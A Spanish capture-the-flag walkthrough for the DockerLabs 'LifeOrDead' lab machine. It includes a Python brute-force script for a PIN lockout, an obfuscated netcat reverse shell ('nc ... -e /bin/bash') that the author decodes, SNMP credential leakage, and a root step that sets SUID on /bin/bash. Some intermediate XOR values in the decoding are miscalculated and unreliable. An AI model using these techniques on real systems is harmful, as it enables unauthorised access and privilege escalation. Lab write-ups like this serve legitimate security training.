---
icon: flag
---

# CTF LifeOrDead Hard

URL Download CTF = [https://drive.google.com/file/d/1qliGzizfQxsTvoG2BfPxDapDCMw4y6T0/view?usp=sharing](https://drive.google.com/file/d/1qliGzizfQxsTvoG2BfPxDapDCMw4y6T0/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip lifeordead.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh lifeordead.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 05:31 EST
Nmap scan report for 172.17.0.3
Host is up (0.000036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:c3:e7:47:85:79:ce:e9:e6:1f:dd:43:37:9b:aa:a5 (ECDSA)
|_  256 4d:80:5f:fa:24:fa:c3:70:fc:bd:39:d8:e7:5b:c7:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```

Si vemos la pagina del puerto `80` vemos que es una pagina normal de `apache2`, que si inspeccionamos la pagina el codigo, vemos algo raro en el `CSS` viendo lo siguiente:

```css
div.page_header {
    height: 180px;
    width: 100%;

    background-color: #F5F6F7;
    background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
  }
```

Y despues en la siguiente parte vemos un nombre que no viene por defecto en `apache2` que es lo siguiente:

```html
<pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
|
|-- admin
          </pre>
```

Vemos que tenemos el nombre de `admin` y despues lo que parece una contraseña codificada en `Base64`, que si la decodificamos veremos lo siguiente:

```
UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU = PASSWORDADMINSUPERSECRET
```

Si bajamos un poco mas en el codigo, veremos un dominio el cual probaremos a entrar con el:

```html
<div class="validator" hidden="lifeordead.dl">
```

Haremos lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>        lifeordead.dl
```

Guardamos y ponemos lo siguiente en la `URL`.

```
URL = http://lifeordead.dl/
```

Veremos un login, pero recordemos que obtuvimos unas credenciales las cuales probaremos a meter en el login:

```
User: admin
Pass: PASSWORDADMINSUPERSECRET
```

Y veremos que entramos en una especie de `Admin panel` en el que tendremos que meter un codigo para identificarnos como el usuario `administrador`, pero como no lo sabemos podemos probar fuerza bruta, tambien tenemos que ver que tenemos `10` intentos y pasados dichos intentos se nos bloqueara unos `30` segundos hasta poder obtener `10` intentos mas, por lo que nos montaremos un script con todas estas caracteristicas.

Pero tendremos que poner la `URL` donde se esta validando todo esto del codigo y si inspeccionamos el codigo de la pagina, veremos que se esta validando en este `.php` que esta en el `javascript`:

```javascript
async function submitCode(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const response = await fetch('pageadmincodeloginvalidation.php', {
                method: 'POST',
                body: formData,
            });
            const data = await response.json();
```

## Fuerza bruta del codigo admin

> bruteForceCode.py

```python
#!/bin/python3

import requests
import time

# URL del formulario PHP que maneja el código
url = 'http://lifeordead.dl/pageadmincodeloginvalidation.php'

# La sesión se mantiene abierta para manejar cookies y encabezados
session = requests.Session()

# Función para enviar el código
def send_code(code):
    # Creamos el payload con el código
    payload = {'code': code}
    response = session.post(url, data=payload)
    return response

# Función para realizar el ataque de fuerza bruta
def brute_force():
    max_attempts = 10  # Intentos máximos
    block_time = 30  # Tiempo de bloqueo en segundos
    attempts_left = max_attempts  # Intentos restantes que se actualizan según el servidor
    current_code = 0  # Empezamos con el código 0000

    while True:
        code_str = f'{current_code:04}'  # Formateamos el código con 4 dígitos
        print(f"Intentando código: {code_str}")

        # Enviar el código al servidor
        response = send_code(code_str)

        if response.status_code == 200:
            try:
                data = response.json()  # Parsear la respuesta JSON
            except ValueError as e:
                print("Error al procesar la respuesta JSON:", e)
                return False

            # Si el código es correcto
            if data.get('status') == 'success':
                print(f"¡Código correcto encontrado! El código es {code_str}")
                return True  # Código correcto encontrado

            # Si el código es incorrecto
            elif data.get('status') == 'failed':
                attempts_left = data.get('attempts')  # Actualizamos los intentos restantes según el servidor
                print(f"Intento fallido. Intentos restantes: {attempts_left}")

            # Si está bloqueado
            elif data.get('status') == 'blocked':
                remaining_time = data.get('remainingTime')
                print(f"Estás bloqueado, esperando {remaining_time} segundos...")
                time.sleep(remaining_time + 1)  # Esperamos el tiempo de bloqueo
                print("Reintentando...")

            # Si el código no es válido (no tiene 4 dígitos o es incorrecto)
            elif data.get('status') == 'invalid':
                print("El código debe ser de 4 dígitos. Reintenta.")
        else:
            print(f"Error al enviar el código, estado {response.status_code}")
        
        # Esperamos un segundo entre cada intento para evitar hacer peticiones muy rápidas
        time.sleep(1)

        # Incrementamos el código para el siguiente intento
        current_code += 1

if __name__ == '__main__':
    print("Iniciando ataque de fuerza bruta para encontrar el código...")
    brute_force()
```

Lo guardamos y ejecutamos de la siguiente forma:

```shell
python3 bruteForceCode.py
```

Info:

```
..........................<RESTO_DE_CODIGO>......................................
Intento fallido. Intentos restantes: 2
Intentando código: 0074
Intento fallido. Intentos restantes: 1
Intentando código: 0075
Intento fallido. Intentos restantes: 10
Intentando código: 0076
Estás bloqueado, esperando 29 segundos...
Reintentando...
Intentando código: 0077
Intento fallido. Intentos restantes: 9
Intentando código: 0078
Intento fallido. Intentos restantes: 8
Intentando código: 0079
Intento fallido. Intentos restantes: 7
Intentando código: 0080
Intento fallido. Intentos restantes: 6
Intentando código: 0081
¡Código correcto encontrado! El código es 0081
```

Vemos que despues de un rato encontramos el codigo que sera el `0081`, el cual si lo introducimos veremos que entramos en una pagina la cual nos muestra una clave secreta que tendremos que guardarnos y tendremos `60` segundos para poder guardarnosla.

```
bbb2c5e63d2ef893106fdd0d797aa97a
```

Vemos que puede ser una posible contraseña para algun usuario del sistema, si enumeramos un poco mas en la pagina llamada `pageadmincodelogin.html` vemos que hay un nombre como comentario:

```html
<!--dimer-->
```

## Escalate user dimer

Si intentamos `crackear` la contraseña de `MD5`, veremos que no podremos, pero si la utilizamos de normal con el propio `hash` veremos que pasa:

```shell
ssh dimer@<IP>
```

Metemos como contraseña `bbb2c5e63d2ef893106fdd0d797aa97a` y veremos que estamos dentro, por lo que leeremos la flag del usuario:

> user.txt

```
c92b22766f900e5bdab6700ab88dabb8
```

## Escalate user bilter

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for dimer on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dimer may run the following commands on dockerlabs:
    (bilter : bilter) NOPASSWD: /opt/life.sh
```

Vemos que podemos ejecutar `/opt/life.sh` como el usuario `bilter`, por lo que haremos lo siguiente:

Si vemos que tiene por dentro el script, veremos esto:

```bash
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash &>/dev/null &
```

Vemos que esta ofuscado el codigo, gran parte en `hexadecimal`, pero si lo decodificamos veremos el codigo de la siguiente forma:

#### **Paso 1: Comprensión de las variables `v1` y `v2`**

v1=$((0xCAFEBABE ^ 0xAC1100BA)) v2=$((0xDEADBEEF ^ 0x17B4))

* **`v1`**: Se calcula haciendo una operación XOR entre los valores hexadecimales `0xCAFEBABE` y `0xAC1100BA`.
* **`v2`**: Se calcula haciendo una operación XOR entre los valores hexadecimales `0xDEADBEEF` y `0x17B4`.

**Cálculos:**

1.  `v1 = 0xCAFEBABE ^ 0xAC1100BA`

    `v1 = 0xCAFEBABE XOR 0xAC1100BA v1 = 0x669F1B04 (hexadecimal) v1 = 1720030212 (decimal)`
2.  `v2 = 0xDEADBEEF ^ 0x17B4`

    `v2 = 0xDEADBEEF XOR 0x17B4 v2 = 0xDEADA83B (hexadecimal) v2 = 3735921211 (decimal)`

***

#### **Paso 2: Reconstrucción de `a` y `b`**

a=$((v1 ^ 0xCAFEBABE)) b=$((v2 ^ 0xDEADBEEF))

Se realiza otra operación XOR para invertir parcialmente los valores originales.

**Cálculos:**

1.  `a = v1 ^ 0xCAFEBABE`

    `a = 0x669F1B04 XOR 0xCAFEBABE a = 0xAC1100BA (hexadecimal) a = 2886734778 (decimal)`
2.  `b = v2 ^ 0xDEADBEEF`

    `b = 0xDEADA83B XOR 0xDEADBEEF b = 0x000017B4 (hexadecimal) b = 6068 (decimal)`

***

#### **Paso 3: Convertir `a` a una dirección IP**

`c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))`

* Aquí se toma el valor `a` (`2886734778`) y se descompone en 4 bytes para formatearlo como una dirección IP.

**Desglose de bytes:**

1. `(a >> 24) & 0xFF` → Byte más significativo (MSB): `0xAC = 172`
2. `(a >> 16) & 0xFF` → Segundo byte: `0x11 = 17`
3. `(a >> 8) & 0xFF` → Tercer byte: `0x00 = 0`
4. `a & 0xFF` → Byte menos significativo (LSB): `0xBA = 186`

**Resultado**:

`c = "172.17.0.186"`

***

#### **Paso 4: Usar `b` como puerto**

`d=$((b))`

* El valor de `b` ya está calculado: `6068`. Este será el puerto para la conexión.

***

#### **Paso 5: Configuración del comando final**

`e="nc" f="-e" g=$c h=$d $e $g $h $f /bin/bash &>/dev/null &`

* `e="nc"`: Es el comando `netcat`, usado para establecer conexiones de red.
* `f="-e"`: La opción `-e` de `netcat` ejecuta un programa al recibir una conexión (en este caso, `/bin/bash`).
* `g=$c`: Dirección IP objetivo (descompuesta previamente como `172.17.0.186`).
* `h=$d`: Puerto objetivo (descompuesto previamente como `6068`).

**Comando completo**:

`nc 172.17.0.186 6068 -e /bin/bash &>/dev/null &`

***

#### **Decodificación Completa**

El script:

1. Calcula la dirección IP y el puerto a partir de operaciones XOR.
2. Usa `netcat` para conectarse a la IP `172.17.0.186` en el puerto `6068`.
3. Ejecuta `/bin/bash` para ofrecer una shell remota al atacante.

El codigo se veria algo parecido a esto:

```bash
#!/bin/bash

set +m

# Dirección IP y puerto calculados explícitamente
c="172.17.0.186"  # Dirección IP
d=6068            # Puerto

# Comando para iniciar una conexión usando netcat
e="nc"
f="-e"
g=$c
h=$d

# Establecer conexión con una shell inversa
$e $g $h $f /bin/bash &>/dev/null &
```

Por lo que vemos esta ejecutando un `nc` para crear una `shell` a una `IP` y puerto en concreto, por lo que haremos lo siguiente:

En nuestro `host` añadiremos la `IP` que esta en el script de la siguiente forma:

```shell
sudo ip addr add 172.17.0.186/16 dev docker0
```

Y una vez que ya hayamos añadido la `IP`, nos pondremos a la escucha con el siguiente puerto:

```shell
nc -lvnp 6068
```

En la maquina victima ejecutamos lo siguiente:

```shell
sudo -u bilter /opt/life.sh
```

Y ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 6068 ...
connect to [172.17.0.186] from (UNKNOWN) [172.17.0.3] 39342
whoami
bilter
```

Vemos que somos dicho usuario.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user purter

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bilter on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bilter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
```

Vemos que podemos ejecutar el script `/usr/local/bin/dead.sh` como el usuario `root`, por lo que haremos lo siguiente:

Vemos que no podemos leer el script, pero si lo ejecutamos vemos lo siguiente:

```shell
sudo /usr/local/bin/dead.sh
```

Info:

```
161
```

Y solo vemos este numero, podemos deducir que puede ser algun puerto que se haya levantado o algo parecido, vamos a comprobar si el puerto `161` esta levantado por `TCP`, pero veremos que no lo esta, por lo que probaremos por `UDP` y aqui veremos que si lo esta:

```shell
nmap -sU -p161 --script=snmp* <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 06:08 EST
Nmap scan report for lifeordead.dl (172.17.0.3)
Host is up (0.000091s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 7f3cbe5245328e6700000000
|   snmpEngineBoots: 12
|_  snmpEngineTime: 3m57s
| snmp-sysdescr: Linux dockerlabs 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
|_  System uptime: 3m58.58s (23858 timeticks)
| snmp-brute: 
|_  public - Valid credentials
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 16.61 seconds
```

Vemos que efectivamente esta abierto, por lo que vamos a probar a ver si se puede enumerar con la siguiente herramienta.

```shell
snmpwalk -v2c -c public <IP>
```

Info:

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux dockerlabs 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (35621) 0:05:56.21
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@lifeordead.dl>"
iso.3.6.1.2.1.1.5.0 = STRING: "dockerlabs"
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (317827) 0:52:58.27
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 01 15 0C 0A 27 00 2B 01 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.8.11-amd64 root=UUID=83f637c8-5a20-46ef-a18a-c151451da541 ro quiet splash
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 17
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Vemos que en la siguiente parte pone lo siguiente:

```
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
```

Vemos que es un cifrado en `Base64`, si lo decodificamos veremos lo siguiente:

```
imposiblepassworduserfinal
```

Por lo que podremos intuir que la contraseña puede ser del usuario `purter`, por lo que haremos lo siguiente:

```shell
su purter
```

Metemos como contraseña `imposiblepassworduserfinal` y veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for purter on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User purter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /home/purter/.script.sh
```

Vemos que podemos ejecutar el script `/home/purter/.script.sh` como el usuario `root`, por lo que haremos lo siguiente.

Vemos que el script esta en nuestra `home`, por lo que podremos eliminarlo y poner con el mismo nombre el contenido que queramos de la siguiente forma:

```shell
rm /home/purter/.script.sh
nano /home/purter/.script.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Guardamos y lo ejecutamos de la siguiente forma:

```shell
chmod +x /home/purter/.script.sh
sudo /home/purter/.script.sh
```

Ahora si probamos a ver los permisos que tiene la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que se aplico de forma correcta el `SUID` a la `bash`, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Vemos que haciendo esto ya seremos `root`, por lo que leeremos la flag de `root`.

> root.txt

```
e04292d1067e92530c22e87ebfc87d28
```
